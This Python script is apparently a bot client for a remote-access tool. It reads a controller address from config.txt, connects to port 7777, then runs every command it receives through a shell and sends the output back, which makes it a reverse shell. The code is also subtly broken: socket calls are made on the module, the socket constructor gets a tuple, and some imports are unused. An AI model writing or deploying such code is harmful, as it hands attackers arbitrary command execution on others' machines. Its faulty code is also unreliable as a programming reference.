from re import sub
import subprocess
import socket
from pathlib import Path
from unittest import result

def init():
    global bot
    host = Path('config.txt').read_text()
    port = 7777
    bot = socket.socket((socket.AF_INET, socket.SOCK_STREAM))
    bot.connect((host, port))
    socket.send("Bot has succesfully connected".encode('utf-8'))
    print(socket.recv(1024).decode("utf-8"))
    
def shell():
    while True:
        command = bot.recv(1024)
        if command == 'q':
            break
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            bot.send(result)

init()
shell()
bot.close()